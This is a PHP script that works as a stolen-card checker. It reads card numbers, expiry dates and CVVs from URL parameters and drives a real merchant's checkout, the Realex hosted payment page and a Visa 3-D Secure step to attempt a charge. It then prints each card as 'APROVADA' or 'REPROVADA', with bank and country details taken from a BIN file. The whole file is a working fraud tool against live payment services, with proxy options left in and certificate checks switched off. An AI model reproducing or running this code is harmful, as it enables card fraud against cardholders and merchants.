<?php

error_reporting(0);
set_time_limit(0);
   function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }
function getstr($string, $start, $end, $offset = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$offset]);
    return $str[0];
}
function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}






if($_GET['testar']=="cc"){
    $ccs = $_GET['ccs'];
    $separa = multiexplode(array(";",".","|",":"),$ccs);
    $id     = $_GET['id'];
    $explode = explode($separa, $ccs);









$numero = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$random = mt_rand(1,99999999);




switch ($ano) {
         case '2019':
         $ano = '19';
         break;
         case '2020':
         $ano = '20';
         break;
         case '2021':
         $ano = '21';
         break;
         case '2022':
         $ano = '22';
         break;
         case '2023':
         $ano = '23';
         break;
         case '2024':
         $ano = '24';
         break;
         case '2025':
         $ano = '25';
         break;
         case '2026':
         $ano = '26';
         break;
         case '2027':
         $ano = '27';
         break;
         case '2028':
         $ano = '28';
         break;
         case '2029':
         $ano = '29';
         break;
         case '2030':
         $ano = '2030';
         break;
         
     } 


        
function _curl($url,$post){
$ch = curl_init();
if($post){
curl_setopt($ch, CURLOPT_POST, true);

$headr = array();
    $headr[] = 'Host: nightowlpapergoods.com';
    $headr[] = 'User-Agent: Kabbee App Android/3.0.14021 (Linux; http://www.lixao.com)';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded';
    $headr[] = 'Origin: http://nightowlpapergoods.com';
    $headr[] = 'Referer: http://nightowlpapergoods.com/giftcard.php';
//curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

}
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
//curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
curl_setopt($ch, CURLOPT_COOKIESESSION, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/testeasd.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/testeasd.txt');
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
return $result;

}






 if(file_exists(getcwd().'/cookiess.txt')) {
        unlink(getcwd().'/cookiess.txt'); 
    
  }
   if(file_exists(getcwd().'/cookiess.txt')) {
        unlink(getcwd().'/cookiess.txt'); 
    


  }



 $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL,'http://www.headseast.com/pages/handle_payment.php');
    
    $headr = array();
    $headr[] = 'Host: www.raceentry.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
    $headr[] = 'Accept: */*';
    $headr[] = 'Referer: https://www.raceentry.com/gift-cards/purchase';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded';
    //curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_TIMEOUT,20);
    curl_setopt($ch, CURLOPT_HEADER,1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'total=1');
    $ex = curl_exec($ch); // Resultado
    $ORDER_ID = value($ex, '<input name="ORDER_ID" type="hidden" value="','"');
    $TIMESTAMP = value($ex, '<input name="TIMESTAMP" type="hidden" value="','"');
    $SHA1HASH = value($ex, '<input name="SHA1HASH" type="hidden" value="','"');


    curl_setopt($ch, CURLOPT_URL,'https://hpp.realexpayments.com/pay');
    $headr = array();
    $headr[] = 'Host: hpp.realexpayments.com';
    $headr[] = 'Origin: http://www.headseast.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
    $headr[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
    $headr[] = 'Referer: http://www.headseast.com/pages/handle_payment.php';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_TIMEOUT,20);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'MERCHANT_ID=chinatravel&ORDER_ID='.$ORDER_ID.'&ACCOUNT=internet&CURRENCY=GBP&AMOUNT=100&TIMESTAMP='.$TIMESTAMP.'&SHA1HASH='.$SHA1HASH.'&AUTO_SETTLE_FLAG=1');
    $ex = curl_exec($ch); // Resultado
    $guid = value($ex, '<input class="rxp-field" name="guid" type="hidden" value="','"');



    curl_setopt($ch, CURLOPT_URL,'https://hpp.realexpayments.com/api/auth');
    $headr = array();
    $headr[] = 'Host: hpp.realexpayments.com';
    $headr[] = 'Origin: https://hpp.realexpayments.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
    $headr[] = 'Accept: */*';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
    $headr[] = 'Referer: https://hpp.realexpayments.com/card.html?guid='.$guid.'';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_TIMEOUT,20);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'pas_cctype=VISA&pas_pareq=&pas_acsurl=&pas_termurl=&encryptMD=&verifyMessage=&verifyResult=&verifyEnrolled=&pas_ccnum='.$numero.'&cardIdentifyError=&pas_expiry='.$mes.'%2F'.$ano.'&pas_cccvc=010&pas_issuenumber=&pas_ccname=faber+caster&guid='.$guid.'&dccchoice=&dccrate=&browserJavaEnabled=false&browserLanguage=pt-BR&screenColorDepth=24&screenHeight=1080&screenWidth=1920&timezoneUtcOffset=180');
    $ex = curl_exec($ch); // Resultado
    $pareq = value($ex, '"pareq":"','"');
    $pareq_enc = urlencode(''.$pareq.'');
    $md = value($ex, '"encryptMerchantData":"','"');
    $md_enc = urlencode(''.$md.'');
    $acsurl = value($ex, '"acsurl":"','"');
  


 curl_setopt($ch, CURLOPT_URL,''.$acsurl.'');
    $headr = array();
    $headr[] = 'Host: aacsw.3ds.verifiedbyvisa.com';
    $headr[] = 'Origin: https://hpp.realexpayments.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
    $headr[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
    $headr[] = 'Referer: https://hpp.realexpayments.com/card.html?guid='.$guid.'';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_TIMEOUT,20);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'PaReq='.$pareq_enc.'&MD='.$md_enc.'&TermUrl=https%3A%2F%2Fhpp.realexpayments.com%2Facs%2FthreeDSecure');
    $ex = curl_exec($ch); // Resultado
    $pares2 = value($ex, '<input type="hidden" name="PaRes" value="','"');
    $pares_enc2 = urlencode(''.$pares2.'');

    $MD2 = value($ex, '<input type="hidden" name="MD" value="','"');
    $MD_ENC2 = urlencode(''.$MD2.'');



 curl_setopt($ch, CURLOPT_URL,'https://hpp.realexpayments.com/acs/threeDSecure');
    $headr = array();
    $headr[] = 'Host: hpp.realexpayments.com';
    $headr[] = 'Origin: https://aacsw.3ds.verifiedbyvisa.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
    $headr[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
    $headr[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
    $headr[] = 'Referer: '.$acsurl.'';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
    curl_setopt($ch, CURLOPT_TIMEOUT,20);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'PaRes='.$pares_enc2.'&MD='.$MD_ENC2.'');
    $ex = curl_exec($ch); // Resultado











        if(strpos($ex, 'Thank You - Payment by Card Completed')!==false){ 

    




$bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}


 echo ' <code><span style="text-shadow: 0 0 7px green; color: green;"> APROVADA  </span> '.$numero.'|'.$mes.'|'.$ano.'|'.$cvv.' Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.')</code></br> ';


   } elseif(strpos($curl, 'ReturnCode":"59')!==false){ 

    




$bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}


 echo '<code><span style="text-shadow: 0 0 7px green; color: green;"> APROVADA  </span> '.$numero.'|'.$mes.'|'.$ano.'|'.$cvv.' Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.')</code></br> ';

  } 
   elseif(strpos($curl, 'N7a')!==false){ 

    




$bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}


 echo ' <code><span style="text-shadow: 0 0 7px green; color: green;"> APROVADA  </span> '.$numero.'|'.$mes.'|'.$ano.'|'.$cvv.' Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.')</code></br> ';

  }  elseif(strpos($curl, 'Transacao capturada com sucesso')!==false){ 

    




$bin = substr($numero, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $teste = $pieces[3];
        $teste1 = $pieces[7];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $teste = $pieces[3];
    $teste1 = $pieces[7];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}


 echo ' <code><span style="text-shadow: 0 0 7px green; color: green;"> APROVADA </span>  '.$numero.'|'.$mes.'|'.$ano.'|'.$cvv.' Info: '.$bandeira.' '.$banco.' '.$teste.' '.$level.'('.$pais.')< /code></br> ';


   }     

       else{ 



                echo"<code><span style='text-shadow: 0 0 7px red; color: red;'> REPROVADA </span>  $numero $mes $ano $cvv $tok </code></br>";

    }

}
?>